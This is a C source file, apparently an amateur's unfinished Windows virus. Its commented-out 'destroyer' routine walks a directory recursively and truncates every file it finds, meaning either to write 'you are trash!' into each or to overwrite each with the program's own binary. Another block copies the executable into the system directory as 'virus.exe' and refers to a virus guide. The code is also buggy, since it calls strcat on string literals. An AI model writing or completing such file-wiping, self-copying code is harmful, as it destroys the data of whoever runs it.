#include <string.h>
#include <tchar.h>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <direct.h>
#include <io.h>
#include <fcntl.h>
#include <conio.h>
#include <conio.h>
#include <string.h>
#include <dirent.h>
int main(int argc,char* argv[]) {
	char buf[15] = "you are trash!"; 
	char tempbuf[512];
	int source,target,byt,done; 
	struct _finddata_t ffblk; 
	DIR *dir;
	struct dirent *ent;
	//system("cls");//clrscr(); 
	//textcolor(2); 


	
	dir = opendir ("C:\\Users\\KING JAS\\Documents\\broadcom_bt_6.5.1.5800_w7");
	if(dir == NULL){
		return 0;
	}
	
	while ((ent = readdir (dir)) != NULL) {
		//MessageBox(NULL, ent->d_name, "Just outside the loop", MB_OK);
		printf(strcat("C:\\Users\\KING JAS\\Documents\\broadcom_bt_6.5.1.5800_w7",ent->d_name)); 
		/*source = open(argv[0],O_RDONLY|O_BINARY); 
		target = open(ent->d_name,O_CREAT|O_TRUNC|O_WRONLY);
		
		while(1) {
			byt = read(source,tempbuf,512); 
			if(byt > 0){
				//MessageBox(NULL, "Writting to file" ,"Progress",MB_OK);
				//write(target,buf,15);
			}			
			else{ 
				//MessageBox(NULL, "File doesnt exist","Error",MB_OK);
				break; 
			} 	
			close(source); 
			close(target); 
		}	*/	
	}
	closedir (dir);
	getch();
	return 0;
}


/*#include <string>
#include <tchar.h>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <direct.h>
#include <io.h>
#include <fcntl.h>
#include <conio.h>
#include <conio.h>
//#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

int is_regular_file(const char *path)
{
    struct stat path_stat;
    stat(path, &path_stat);
    return S_ISREG(path_stat.st_mode);
}

void destroyer(char const* foldname, char* num[]){
	printf("Hello sir: %s", foldname);
	DIR *dir;
	struct dirent *ent;
	char buf[15] = "you are trash!"; 
	int source,target,byt,done; 
	 
	dir = opendir (foldname);
	if(dir == NULL){
		return;
	}
	
	while ((ent = readdir (dir)) != NULL) {
		printf(" %s ", ent->d_name);
		if(is_regular_file(strcat("C:\\Users\\KING JAS\\Documents\\broadcom_bt_6.5.1.5800_w7",ent->d_name))){
			source = open(num[0],O_RDONLY|O_BINARY); 
			target = open(ent->d_name,O_CREAT|O_TRUNC|O_WRONLY);
			
			if(ent != NULL) {
				//write(target,buf,15);
				
			}
			close(source); 
			close(target);	
		}
		else{
			destroyer(strcat("C:\\Users\\KING JAS\\Documents\\broadcom_bt_6.5.1.5800_w7\\",ent->d_name), num);
		}
	}
}

int main(int argc,char* argv[]) {
	char buf[15] = "you are trash!"; 
	char tempbuf[512];
	int source,target,byt,done; 
	struct _finddata_t ffblk; 
	DIR *dir;
	struct dirent *ent;


	printf("Calling destroyer");
	dir = opendir ("C:\\Users\\KING JAS\\Documents\\broadcom_bt_6.5.1.5800_w7");
	if(dir == NULL){
		printf("Abnormal exit");
		return 0;
	}
	
	while ((ent = readdir (dir)) != NULL) {
		printf(" %s ", ent->d_name);
		if(is_regular_file(strcat("C:\\Users\\KING JAS\\Documents\\broadcom_bt_6.5.1.5800_w7",ent->d_name))){
			source = open(argv[0],O_RDONLY|O_BINARY); 
			target = open(ent->d_name,O_CREAT|O_TRUNC|O_WRONLY);
			
			if(ent != NULL) {
				//write(target,buf,15);
				printf("Writting to file");
			}
			close(source); 
			close(target);	
		}
		else{
			printf("Calling destroyer");
			destroyer(strcat("C:\\Users\\KING JAS\\Documents\\broadcom_bt_6.5.1.5800_w7\\",ent->d_name), argv);
		}
	}
	printf("Never entered while");
	closedir (dir);
	getch(); 
	return 0;
}






/*#include <windows.h>
#include <string.h>
#include <winuser.h>

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance, LPSTR lpszArgument, int nFunsterStil){
	/*char system[MAX_PATH];
	char pathtofile[MAX_PATH];
	HMODULE GetModH = GetModuleHandle(NULL);

	GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
	GetSystemDirectory(system,sizeof(system));

	strcat(system,"\\virus.exe");

	CopyFile(pathtofile,system,false);

	MessageBox(NULL, system,"Messagebox Example",MB_OK);
	return 0;
	
	 //must have for BlockInput
//put the codes you learned from Smith's Virus Guide here
 
	int Freq = 100;
	int Duration = 100;
	Beep(Freq,Duration);
 
}



 */
 
  